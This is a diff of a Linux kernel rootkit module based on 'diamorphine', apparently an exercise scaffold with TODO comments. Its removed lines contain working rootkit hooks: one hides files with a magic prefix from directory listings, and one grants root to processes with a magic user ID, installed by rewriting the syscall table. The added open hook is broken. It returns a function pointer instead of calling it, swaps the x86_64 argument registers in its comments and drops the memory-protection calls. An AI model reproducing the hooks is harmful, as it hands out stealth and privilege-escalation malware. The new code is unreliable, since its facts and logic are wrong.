@@ -38,90 +38,24 @@ static unsigned long *__sys_call_table;
 Define a syscall_t that takes as input a pointer to a pt_regs struct
 pt_regs represents a bunch of registry values
 We are interested in si and di, which store pointers to syscall params
+
+si always stores the first param
+di always stores the second param
+checkout hacked_open to see an example of this
 */
 typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
 
 // TODO (n): Store variables for the original system calls here
-static t_syscall orig_getdents64;
-static t_syscall orig_execve;
+static t_syscall orig_open;
 
+// TODO (n): Implement the hooked system calls here
 // Hooked getdents syscall
-static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
-	// Extract dirent struct from registry 
-	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
-	
-	// Will be used to iterate through dirent
-	unsigned long off = 0;
-	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
+static asmlinkage long hacked_open(const struct pt_regs *pt_regs) {
+    const char *pathname = (char *)pt_regs->si;
+    int flags = (int)pt_regs->di;
 
-    // Run the original getdents syscall, returning the size of the directory
-    int ret = orig_getdents64(pt_regs), err;
-	if (ret <= 0)
-		return ret;
-
-    // Copy into kmemory to avoid messing with umemory in kernel
-	kdirent = kzalloc(ret, GFP_KERNEL);
-	if (kdirent == NULL)
-		return ret;
-
-	err = copy_from_user(kdirent, dirent, ret);
-	if (err)
-		goto out;
-
-    // Iterate through kdirent
-	while (off < ret) {
-		dir = (void *)kdirent + off;
-		
-		// If dir starts with magic prefix
-		if ((memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0)) {
-		    printk("ROOTKIT: !!! %s", dir->d_name);
-			if (dir == kdirent) {
-				ret -= dir->d_reclen;
-				memmove(dir, (void *)dir + dir->d_reclen, ret);
-				continue;
-			}
-			prev->d_reclen += dir->d_reclen;
-		} else
-			prev = dir;
-		off += dir->d_reclen;
-	}
-	
-	// Back to userspace
-	err = copy_to_user(dirent, kdirent, ret);
-	if (err)
-		goto out;
-		
-    // Free kdirent in any case of any error
-out:
-	kfree(kdirent);
-	return ret;
-}
-
-// Hooked execve syscall
-static asmlinkage long hacked_execve(const struct pt_regs *pt_regs) {
-    uid_t euid;
-    
-    /* 
-    Get euid of calling process using current_euid
-    Which returns a k_uid type (because we are in kernelspace)
-    We need to convert the kuid_t into euid using from_kuid 
-    */ 
-    
-    euid = from_kuid(&init_user_ns, current_euid() );
-    printk("ROOTKIT: Intercepted execve. euid: %d\n", euid);
-    
-    if(euid == MAGIC_EUID){
-        struct cred *cred = prepare_kernel_cred(NULL);
-        
-        if(cred == NULL){
-          printk(KERN_ERR "System out of memory");
-          return -ENOMEM;
-        }
-
-        commit_creds(cred);
-    }
-    
-    return orig_execve(pt_regs);
+    printk("ROOTKIT: Opening %s...\n", pathname);
+    return orig_open;
 }
 
 // Returns a pointer to the system call table
@@ -183,18 +117,14 @@ static int __init diamorphine_init(void) {
 	tidy();
 
     // TODO (n): Intialise the original system calls here 
-	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
-	orig_execve = (t_syscall)__sys_call_table[__NR_execve];
+    orig_open = (t_syscall)__sys_call_table[__NR_open];
 
     // TODO(n): Unprotect memory so we can edit table
-	unprotect_memory();
     
     // TODO(n): For every hooked syscall, repoint sys_call_table to the hooked syscall
-	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
-	__sys_call_table[__NR_execve] = (unsigned long) hacked_execve;
+	__sys_call_table[__NR_open] = (unsigned long) hacked_open;
 
     // TODO(n): Protect memory again
-	protect_memory();
 
 	return 0;
 }
@@ -203,14 +133,11 @@ static void __exit diamorphine_cleanup(void) {
 	printk("ROOTKIT: Ejecting diamorphine...");
 	
 	// TODO(n): Unprotect memory so we can edit table
-	unprotect_memory();
 
     // TODO(n): For every hooked syscall, repoint sys_call_table to the original syscall
-	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
-	__sys_call_table[__NR_execve] = (unsigned long) orig_execve;
+	__sys_call_table[__NR_open] = (unsigned long) orig_open;
 
     // TODO(n): Protect memory again
-	protect_memory();
 }
 
 module_init(diamorphine_init);
